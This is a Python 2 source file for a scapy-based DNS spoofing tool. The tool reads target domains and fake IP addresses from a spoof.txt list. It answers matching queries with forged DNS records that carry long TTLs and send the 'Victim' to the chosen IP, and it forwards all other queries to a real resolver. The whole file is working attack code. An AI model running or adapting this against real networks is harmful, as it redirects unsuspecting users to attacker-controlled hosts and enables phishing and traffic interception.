#!/usr/bin/env python
		
from time import sleep 
import socket
from scapy.all import *

class dhakkan_dns():

		def __init__(self, pkt, dns_srv):
				self.pkt = pkt
				self.dns = DNS(self.pkt)
				self.dns_srv = dns_srv
				
				
		
		# Loading the domain names to spoof from file.
		def load_Domains(self):
				try:
						test = open("spoof.txt", "r")	# Open the file with spoofed domain list
						read = test.read()		        # Read the file contents
						li = read.split()		        # Split the File contents
				
						#converting list "li" to Key => value pair.
						dic = dict(zip(li[::2],li[1::2]))
						return dic                      # Return Dictionary of Key Value pair
		
				
				except IOError, exception:
						print "**** Error reading the spoof.txt file : ****"
						print exception				
							
		
		
		#check if we need to send a fake response or query a DNS and send origional packet
		def packet_to_send(self):
				qd = self.dns[DNSQR]		            # Extract origional Query packet embedded in qd.
				qname = qd.qname
				dic1 = self.load_Domains
				dic = dic1()
				fake_ip = dic.get(qname, "none")
				print "[*] The Queried Domain Name is",qname
				print "[*] Does the Queried Domain Name Exists in spooflist : ", dic.has_key(qname)
				print "[*] Fake reply with IP address being sent to the Victim : " , fake_ip 
				#If the Query Domain exists in spoofed domain list create fake packet.
				if(dic.has_key(qname)):
						return self.fake_dns_packet(fake_ip)
						#print "packet matched"
				
				else:
						return self.get_dns_response()
						#print "packet did not match"
		
		
		
		
		# Creating fake Response DNS packets
		def fake_dns_packet(self, fake_ip):
				qd = self.dns[DNSQR]		# Extract origional Query packet embedded in qd.
				
				res_dns = DNS(id = self.dns.id, qr = 1, qdcount = 1, ancount = 1, arcount = 1, nscount = 1, rcode = 0)	# Create a fake DNS response base
				res_dns.qd = qd			                                                                                # making sure same question goes back to client else it will discard packet
				res_dns.an = DNSRR(rrname = qd.qname, ttl = 86400, rdlen = 4, rdata = fake_ip)			                # append fake anser to the packet to query domain
				res_dns.ns = DNSRR(rrname = qd.qname, ttl = 86400, rdlen = 4, rdata = fake_ip)			                # append NS responses for Query domain
				res_dns.ar = DNSRR(rrname = qd.qname, ttl = 86400, rdlen = 4, rdata = fake_ip)			                # Append Authoritative Answer for query domain.
				response = str(res_dns)
				return response
				
		
		#Query another DNS server and get the response back when the Host does not exist in the spoof list		
		def get_dns_response(self):
				
				ip = IP(dst=self.dns_srv)                               #Creating IP packet
				udp = UDP(sport=RandShort(), dport=53)                  #Creating UDP packet with a dynamic source port and dst=53
				qd = self.dns[DNSQR]                                    #Creating the Query packet with origional query from the client
				dns = DNS(id = self.dns.id, rd=1,qd=self.dns[DNSQR])
				response1 = sr1(ip/udp/dns)
				response = str(response1[DNS])
				return response
		




    